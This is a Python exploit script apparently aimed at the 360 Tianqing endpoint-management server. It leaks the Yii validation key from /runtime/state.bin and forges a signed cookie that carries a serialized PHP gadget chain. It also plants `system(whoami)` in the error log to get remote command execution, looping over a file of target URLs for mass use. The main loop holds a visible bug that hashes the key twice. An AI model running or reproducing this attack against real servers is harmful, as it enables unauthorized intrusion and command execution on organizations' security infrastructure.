import argparse
import hashlib
import hmac
from colorama import *
import colorama
init(autoreset=True)
import requests
import urllib3
import phpserialize
urllib3.disable_warnings()


data = "O:24:\"Smarty_Internal_Template\":1:{s:6:\"smarty\";O:10:\"CWebModule\":2:{s:20:\"\u0000CModule\u0000_components\";a:0:{}s:25:\"\u0000CModule\u0000_componentConfig\";a:1:{s:13:\"cache_locking\";a:4:{s:5:\"class\";s:11:\"CUrlManager\";s:12:\"urlRuleClass\";s:14:\"CConfiguration\";s:5:\"rules\";a:1:{i:0;s:21:\"../www/logs/error.log\";}s:9:\"UrlFormat\";s:4:\"path\";}}}}"


def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+                          360天擎!启动                        +')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.BLUE +  '+        writer:          yuejinjianke                        +')
    print('\n')

#    爬取密钥
def spider_key(url):

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
    }
    path = '/runtime/state.bin'
    response = requests.get(url=url+path,verify=False,headers=headers)
    serialized_string = response.text.encode('utf-8')
        # 反序列化
    unserialized_data = phpserialize.unserialize(serialized_string)

        # 获取 Yii.CSecurityManager.validationkey 对应的值
    validation_key = unserialized_data[b'Yii.CSecurityManager.validationkey'].decode('utf-8')
    return validation_key


# 反序列化数据
def calculate_hmac_sha1(validation_key,data):
    key_bytes = bytes(validation_key,'utf-8')
    hmac_sha1 = hmac.new(key_bytes, data.encode('utf-8'), hashlib.sha1)
    hmac_sha1_hexdigest = hmac_sha1.hexdigest()
    return hmac_sha1_hexdigest


# 具体利用
def exploit(validation_key,url):
    csrf_token =  calculate_hmac_sha1(validation_key,data)
    print(colorama.Fore.GREEN + "[*] 你所获得的csrf_token为： " + csrf_token)
    url1 = url + "/%3Cscript+language=%22php%22%3Esystem(" + "whoami" + ")"";%3C/script%3E"
    url2 = url + "/login?refer=%2F"
    headers = {
        'Cookie': 'YII_CSRF_TOKEN=' + csrf_token + 'O%3A24%3A%22Smarty_Internal_Template%22%3A1%3A%7Bs%3A6%3A%22smarty%22%3BO%3A10%3A%22CWebModule%22%3A2%3A%7Bs%3A20%3A%22%00CModule%00_components%22%3Ba%3A0%3A%7B%7Ds%3A25%3A%22%00CModule%00_componentConfig%22%3Ba%3A1%3A%7Bs%3A13%3A%22cache_locking%22%3Ba%3A4%3A%7Bs%3A5%3A%22class%22%3Bs%3A11%3A%22CUrlManager%22%3Bs%3A12%3A%22urlRuleClass%22%3Bs%3A14%3A%22CConfiguration%22%3Bs%3A5%3A%22rules%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A21%3A%22..%2Fwww%2Flogs%2Ferror.log%22%3B%7Ds%3A9%3A%22UrlFormat%22%3Bs%3A4%3A%22path%22%3B%7D%7D%7D%7D'
    }

    # proxy_address = '127.0.0.1:10810'
    # proxies = {
    #     'http': 'socks5://127.0.0.1:10810',
    #     'https': 'socks5://127.0.0.1:10810'
    # }

    try:
        r1 = requests.get(url=url1, verify=False,timeout=3)  # ,proxies=proxies)
        r2 = requests.get(url=url2, verify=False, headers=headers,timeout=3)  # ,proxies=proxies)

        if "exception.CHttpException.404" in r2.text:
            print(colorama.Fore.GREEN + "[*] 漏洞存在！执行结果在上方最近一次的时间中" + url)
        else:
            print(colorama.Fore.RED + "[-] 这个漏洞经测试很不稳定，请过会再试" + "--------->目标url:" + url)
    except Exception as e:
        print(colorama.Fore.RED + "[-] 网络出现问题")


if __name__ == '__main__':
    title()

    parser = argparse.ArgumentParser("zoomeyetool made by yuejinjianke")
    parser.add_argument(
        '-f', '--file',
        metavar='', required=True, type=str,
        help='please input your file. eg: 111.txt'
    )
    args = parser.parse_args()

    with open(args.file,'r') as fp:
         for line in fp:
             url = line.strip()
             try:
                key = spider_key(url)
             except Exception as e:
                print(colorama.Fore.RED + "[-] 未取到密钥,下一个")
                continue
             result = calculate_hmac_sha1(key,data)
             exploit(result, url)